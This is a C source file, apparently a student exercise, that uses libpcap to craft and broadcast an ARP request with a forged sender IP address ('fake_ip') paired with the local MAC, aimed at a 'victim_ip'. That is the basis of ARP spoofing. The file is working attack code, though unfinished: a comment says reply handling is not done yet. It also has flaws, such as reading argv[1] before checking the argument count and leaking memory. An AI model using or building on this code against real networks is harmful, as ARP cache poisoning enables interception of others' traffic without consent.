#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <arpa/inet.h>
#include <net/ethernet.h>

#define MAC_BUF_LEN 20
#define PACKET_SIZE 60

void get_mac(u_int8_t *shost);
void make_eth(u_char *packet);
void make_arp(u_char *packet,u_char *victim_ip,u_char *fake_ip);

typedef struct ether_header ether_header; //ethernet.h
typedef struct ether_arp ether_arp; //if_ether.h

const char *kMacDirectory = "/sys/class/net/eth0/address";

int main(int argc, char *argv[])
{

	pcap_t *handle;			/* Session handle */
	char *dev;			/* The device to sniff on */
	char errbuf[PCAP_ERRBUF_SIZE];	/* Error string */
	struct bpf_program fp;		/* The compiled filter */
	char filter_exp[] ="";	/* The filter expression */
	bpf_u_int32 mask;		/* Our netmask */
	bpf_u_int32 net;		/* Our IP */
	struct pcap_pkthdr header;	/* The header that pcap gives us */
	u_char *packet=malloc(PACKET_SIZE);		/* The actual packet */
	
	/* Define the device */

	dev = pcap_lookupdev(errbuf);
	if (dev == NULL) {
		fprintf(stderr, "Couldn't find default device: %s\n", errbuf);
		return(2);
	}

	/* Find the properties for the device */

	if (pcap_lookupnet(argv[1], &net, &mask, errbuf) == -1) {
		fprintf(stderr, "Couldn't get netmask for device %s: %s\n", dev, errbuf);
		net = 0;
		mask = 0;
	}


	/* Open the session in promiscuous mode */

   handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == NULL) {
		fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
		return(2);
	}

	/* Compile and apply the filter */

	if (pcap_compile(handle, &fp, filter_exp, 0, net) == -1) {
		fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(handle));
		return(2);
	}
	if (pcap_setfilter(handle, &fp) == -1) {
		fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
		return(2);
	}
	if (argc<4){puts("more more\n"); return(2);}
	make_eth(packet);
	make_arp(packet,argv[2],argv[3]);
	if(pcap_sendpacket(handle,packet,PACKET_SIZE))
		puts("fail");
	pcap_next_ex(handle, &header,&packet);  // will get a mac_ad but not yet....
	
	pcap_close(handle);
	return(0);
}

void get_mac(uint8_t *shost)
{
	FILE *fp = fopen(kMacDirectory, "r");
	char mac[MAC_BUF_LEN] = {'\0', };
	ether_header* ether=malloc(sizeof(ether_header));

	fgets(mac, MAC_BUF_LEN, fp);
	for(int i=0;i<ETH_ALEN;i++){
		ether->ether_shost[i] = strtol(&mac[i*3], NULL, 16);
		if(i!=ETH_ALEN-1)printf("%02X :",ether->ether_shost[i]);
		else printf("%02X\n",ether->ether_shost[i]);
	}

	fclose(fp);
	memcpy(shost, ether->ether_shost, ETH_ALEN);
}

void make_eth(u_char *packet)
{

	ether_header *ether;
	ether=(ether_header *)packet;
	u_int8_t *shost_temp = malloc(ETH_ALEN);
	get_mac(shost_temp);
	memcpy(ether->ether_shost,shost_temp,ETH_ALEN);
	ether->ether_type=htons(0x0806); //ETHERTYPE_ARP
	printf("eth_dho:");
	memset(ether->ether_dhost,0xff,ETH_ALEN);
	for(int i=0;i<ETH_ALEN;i++){
	//ether->ether_dhost[i]=0xff;
	printf("%02X : ",ether->ether_dhost[i]);}
	printf("eth_type:%04X\n",ether->ether_type);
}
void make_arp(u_char *packet,u_char *victim_ip,u_char *fake_ip)
{
	u_int16_t hd_type=0x0001;
	u_int16_t pro_type=0x0800;
	u_char hd_size=0x06;
	u_char pro_size=0x04;
	u_int16_t opcode=0x0001;
	//ether_header *ether;
	ether_arp *arp;
	
	packet+=sizeof(ether_header);
	arp=(ether_arp *)packet;
	
	/*ether_arp -  arphdr ea_hdr*/
	arp->ea_hdr.ar_hrd=htons(hd_type);
	arp->ea_hdr.ar_pro=htons(pro_type);
	arp->ea_hdr.ar_hln=(hd_size);
	arp->ea_hdr.ar_pln=(pro_size);
	arp->ea_hdr.ar_op=htons(opcode);
	/*change like define!*/
	printf("arp_sMAC:");
//	for(int i=0;i<ETH_ALEN;i++){
		get_mac(arp->arp_sha);
//		if(i!=ETH_ALEN-1)printf("%02X :",arp->arp_sha[i]);
//		else printf("%02X\n",arp->arp_sha[i]);
//	}
	inet_pton(AF_INET,fake_ip,arp->arp_spa);
		memset(arp->arp_tha,0x00,ETH_ALEN);
//		for(int i=0;i<ETH_ALEN;i++){
//			if(i!=ETH_ALEN-1)printf("%02X :",arp->arp_tha[i]);
//			else printf("%02X\n",arp->arp_tha[i]);
//		}
	inet_pton(AF_INET,victim_ip,arp->arp_tpa);
}







